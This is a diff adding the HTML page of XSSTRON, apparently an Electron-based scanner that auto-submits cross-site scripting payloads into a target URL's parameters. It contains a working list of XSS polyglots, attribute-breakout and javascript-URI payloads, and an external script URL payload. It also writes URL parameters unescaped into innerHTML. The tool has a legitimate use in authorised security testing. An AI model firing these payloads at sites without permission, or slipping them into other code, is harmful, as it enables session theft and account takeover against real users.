@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>XSSTRON</title>
+    
+  </head>
+  <body>
+
+<center><h3 style="color:magenta;font-size: 30px;">XSSTRON</h3>
+  <center><h3 id=xsx style="color:rgb(255, 0, 0);font-size: 25px;"></h3>
+<h5 id=h5 style="color:rgb(1, 18, 255);font-size: 20px;"></h5>
+<h5 id=h52 style="color:rgb(0, 255, 55);font-size: 20px;"></h5>
+
+</center>
+
+<script>
+
+var htmlp = `javascript:/*xssx'">--></noscript></title></textarea></style></template></noembed><\/script><img src=x onerror=pinghost(1)//>*/;top.pinghost(2)//`
+var jsj = `javascript:top.pinghost(1)`
+var atrx = `x id=clx onclick=top.pinghost(1)// `
+var atrx1 = `' id="clx" onclick="top.pinghost(1)//"" '`
+var atrx2 = `" id=clx onclick=top.pinghost(1)// "`
+var jsp1 = `'-top.pinghost(1)-'`
+var jsp2 = `"-top.pinghost(1)-"`
+var jsp3 = `\`-\${top.pinghost(1)}-\``
+var ujs1 = `///qrsha.000webhostapp.com/xsstron.php`
+
+
+var j = new URL(location).searchParams.get('shqlipqli')
+var jd = new URL(location).searchParams.get('shqlipqlip')
+
+  document.getElementById('h5').innerHTML='URL Tested: <span style=color:black>'+j+'</span>'
+  document.getElementById('h52').innerHTML='Parameters Tested: <span style=color:black>'+decodeURIComponent(jd)+'</span>'
+
+ 
+var w;
+
+function escapeHtml(unsafe) {
+    return unsafe
+         .replace(/&/g, "&amp;")
+         .replace(/</g, "&lt;")
+         .replace(/>/g, "&gt;")
+         .replace(/"/g, "&quot;")
+         .replace(/'/g, "&#039;");
+ }
+ 
+ var state=0;
+
+ var swich=1;
+
+
+function cw(x,y,z,v){
+
+  var queryDict = {}
+
+  z.split("&").forEach(function(item) {queryDict[item.split("=")[0]] = item.split("=")[1]})
+
+  var px='';
+
+    for (var key in queryDict) {
+    if (queryDict.hasOwnProperty(key)) {
+      px+='<input name="'+key+'"" value="'+escapeHtml(v)+'">'
+    }}
+
+    var url = `data:text/html;base64,${btoa(`<form action=${x+"#shetajyanmx"} method=POST>${px}<input type=submit></form><script>document.forms[0].lastElementChild.click()<\/script>`)}`
+
+  if(swich){
+
+  let w = document.createElement('webview')
+ w.setAttribute('src',url)
+ w.setAttribute('preload','./d.js')
+ w.setAttribute('id','htmlw')
+ w.setAttribute('enableRemoteModule','true')
+
+ document.body.appendChild(w)
+
+w.addEventListener('ipc-message', event => {
+urls=atob((url).split(',')[1]).replaceAll('pinghost','alert').replaceAll('#shetajyanmx','')
+
+  window.resizeTo(800, 600); 
+   top.xsx.innerHTML+='XSS Found : <span style="color:black"><br><textarea style=font-size:17px rows=10 cols=70>data:text/html;base64,'+escapeHtml(decodeURIComponent(btoa(urls)))+'</textarea></span><br>'
+   state=1;
+   swich=0;
+   window.focus();
+   alert('XSS Found')
+ }) 
+  
+  setTimeout(function(){
+  if(!state){
+  window.close();
+   }},6500);
+
+ 
+   if(y=23){
+   w.addEventListener('dom-ready', () => {
+setTimeout(function(){
+w.executeJavaScript(`var x= document.querySelector("[href^='javascript:/']"); if(x){x.click()}`) 
+w.executeJavaScript(`var x= document.querySelector('[onclick*=top]');if(x){x.click()}`)
+}
+,300);
+
+})}
+else{
+  setTimeout(function(){
+    w.remove();
+  },1000)
+}}
+
+}
+
+setTimeout(() => {
+  cw(j,null,jd,htmlp)
+  cw(j,null,jd,jsj)
+  cw(j,23,jd,atrx)
+  cw(j,23,jd,atrx1)
+  cw(j,23,jd,atrx2)
+  cw(j,null,jd,jsp1)
+  cw(j,null,jd,jsp2)
+  cw(j,null,jd,jsp3)
+  cw(j,null,jd,ujs1)
+
+}, 100);
+
+  </script>
+
+  </body>
+</html>
